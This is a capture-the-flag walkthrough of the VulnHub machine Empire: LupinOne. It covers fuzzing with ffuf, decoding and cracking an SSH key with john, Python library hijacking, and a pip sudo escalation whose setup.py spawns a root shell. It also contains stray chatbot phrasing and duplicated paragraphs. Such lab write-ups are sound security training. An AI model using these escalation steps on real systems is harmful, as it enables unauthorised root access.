# Empire: LupinOne

**Empire: LupinOne** is a VulnHub machine designed by icex64 and Empire Cybersecurity, featuring a mix of easy-to-medium level vulnerabilities for penetration testing.

## Description

This machine provides an opportunity to practice various penetration testing methodologies, including network scanning, enumeration, exploitation, and privilege escalation.

## Pentesting Methodology

### Network Scanning

To begin, utilize `netdiscover` to scan the network for the IP address of the victim machine. Then proceed with Nmap:

```bash
nmap -sC -sV 192.168.1
```

### Enumeration

- Abuse HTTP services
- Fuzzing

### Exploitation

- Using `john` for password cracking
- SSH exploitation

### Privilege Escalation

- Utilize `linpeas` for privilege escalation
- Python library hijacking
- Exploiting `pip`
- Obtaining root flag

## Level

Easy-Medium

## Readme File

**Empire: LupinOne VulnHub Machine**

**Description:** Empire: LupinOne is a VulnHub machine designed by icex64 and Empire Cybersecurity, featuring a mix of easy-to-medium level vulnerabilities for penetration testing.

**Pentesting Methodology:**
- **Network Scanning:** Use `netdiscover` to scan for the victim machine's IP address. Then, run Nmap for detailed service enumeration.
- **Enumeration:** Explore HTTP services, particularly `/~myfiles`.
- **Exploitation:** Crack passwords using `john`, exploit SSH, and leverage identified vulnerabilities.
- **Privilege Escalation:** Utilize `linpeas`, Python library hijacking, exploit `pip` for privilege escalation, and finally, obtain the root flag.

**Level:** Easy-Medium

Certainly! Here's how you can incorporate the enumeration finding into your README file:

---

**Enumeration:**

We began the enumeration procedure by inspecting the `/~myfiles` HTTP page. Upon accessing [http://192.168.1.2/~myfiles/](http://192.168.1.2/~myfiles/), we discovered an Error 404, which seemed suspicious.

We looked at the view page source and found the comment “you can do it, keep trying”.

Certainly! Here's how you can include this information in your README file:

**Enumeration:**

1. **Inspection of `/~myfiles` Page:**
   We began the enumeration procedure by inspecting the `/~myfiles` HTTP page. Upon accessing [http://192.168.1.2/~myfiles/](http://192.168.1.2/~myfiles/), we discovered an Error 404, which seemed suspicious.

2. **View Page Source:**
   Upon examining the page source, we found the comment "you can do it, keep trying."

3. **Fuzzing with ffuf:**
   To gather additional information, we employed fuzzing techniques using ffuf. We utilized the common.txt wordlist from `/usr/share/seclists/Discovery/Web-Content/` and targeted the URL [http://192.168.1.2/~FUZZ](http://192.168.1.2/~FUZZ), where we found a directory named "secret."
   
   Command used:
   ```
   ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.1.2/~FUZZ'
   ```

---

This README section outlines the steps taken during the enumeration phase, including the inspection of the initial page, findings from viewing the page source, and the use of fuzzing techniques with ffuf to discover the "secret" directory. Feel free to customize it further or add more details if needed.
![image4](https://github.com/kanhaiyasingh12/lupin/blob/main/Screenshot%202024-05-12%20085247.png)
Take a good look at that secret directory and analyze that here the author is sharing some
information related to the SSH private key file related to user “icex64” that we need to fuzz.
![image5](https://github.com/kanhaiyasingh12/lupin/blob/main/Screenshot%202024-05-12%20085257.png)

To find that secret private ssh key, we again used fuzzing with the help of ffuf once more and
found a text file (mysecret.txt).
# ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u
# 'http://192.168.1.2/~secret/.FUZZ' -fc 403 -e .txt,.html
![image6](https://github.com/kanhaiyasingh12/lupin/blob/main/Screenshot%202024-05-12%20085306.png)
To find that secret private ssh key, we again used fuzzing with the help of ffuf once more and
found a text file (mysecret.txt).
# ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u
# 'http://192.168.1.2/~secret/.FUZZ' -fc 403 -e .txt,.html
We explore mysecret.txt with a web browser. It appears to be a private ssh key, but it is
encoded.
We thoroughly examined this key and discovered that it is encoded in base 58.
http://192.168.1.2./~secret/.mysecret.txt
![image7](https://github.com/kanhaiyasingh12/lupin/blob/main/Screenshot%202024-05-12%20085318.png)
We looked up a base 58 decoder online and were met with browserling. It is the most basic
online base-58 decoder for web developers and programmers.
Simply enter your data in the form below, click the Base-58 Decode button, and you’ll be
presented with a base-58 encoded string. We obtained our ssh-key after decoding it.

# Exploitation
Since the author has shared some hints related to passphrases for SSH Key, thus we are using
ssh2john to obtain the hash value of the ssh-key.
# find / -iname ssh2john
# /usr/share/john/ssh2john.py sshkey > hash
Now, use john to crack the hash value.
# john --wordlist=/usr/share/wordlists/fastrack.txt hash
In a few seconds, Bingo!! We obtained the ssh-key password (P@55w0rd!).
We have all of the requirements for ssh login. Use our icex64 username, ssh-key, and cracked
password (P@55w0rd!).
# ssh -i sshkey icex64@192.168.1.2
We promptly examined that file and discovered that it could be exploited using the Python
Library Hijacking approach.
# sudo -l
# cat /home/arsene/heist.py
![image9](https://github.com/kanhaiyasingh12/lupin/blob/main/Screenshot%202024-05-12%20085359.png)

# Privilege Escalation
We’ve started the process of escalating privileges. To begin with the Python Library Hijacking
technique, we must first determine the coordinates of webbrowser.py. That’s why we’re
employing the linpeas script.
We’ve previously downloaded the Linpeas script from the git page. Now we just navigate to that
directory and launch a basic Python http server.
python2 -m SimpleHTTPServer 80

Now we’ll switch to the icex64 terminal. We moved the directory to /tmp directory and imported
the Linpeas script from Kali Linux using the wget function.
# cd /tmp
# wget 192.168.1.3/linpeas.sh
Then we granted the script ALL permissions. Then we ran it right away.
./linpeas.sh
![image11](https://github.com/kanhaiyasingh12/lupin/blob/main/Screenshot%202024-05-12%20085415.png)
We obtained the location of the Python file in a matter of seconds (webbrowser.py).
![image12](https://github.com/kanhaiyasingh12/lupin/blob/main/Screenshot%202024-05-12%20085424.png)
We obtained the location of the Python file in a matter of seconds (webbrowser.py).
We can now begin our Python Library Hijacking procedure where an attacker is introduced into a
python-enabled environment, you can learn more about this strategy by clicking here.
To operate this python file, we utilized the nano command and edited the script to call /bin/bash
code into it.
# os.system ("/bin/bash")

# os.system ("/bin/bash")
After all of this effort, we ran the sudo command in conjunction with the coordinates specified in
the permissions check on icex64. To switch the user icex64 to arsene.
# sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
We got the user arsene and checked this user SUDO permissions and found the user has
privilege to execute pip binary as root without authentication. We have an idea to do pip
privilege escalation after evaluating a few more moments.
# sudo -l
![images14](https://github.com/kanhaiyasingh12/lupin/blob/main/Screenshot%202024-05-12%20085438.png)
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
We got the user arsene and checked this user SUDO permissions and found the user has
privilege to execute pip binary as root without authentication. We have an idea to do pip
privilege escalation after evaluating a few more moments.
sudo -l
We used the gtfobin instructions provided here to conduct pip privilege escalation. If the
programme is allowed to run as superuser by sudo, it retains its elevated rights and can be used
to access the file system, escalate, or keep privileged access.
To conduct pip privilege escalation, we only need to run these three commands.
# TF=$(mktemp -d)
# echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
# sudo pip install $TF
We obtained the root flag.
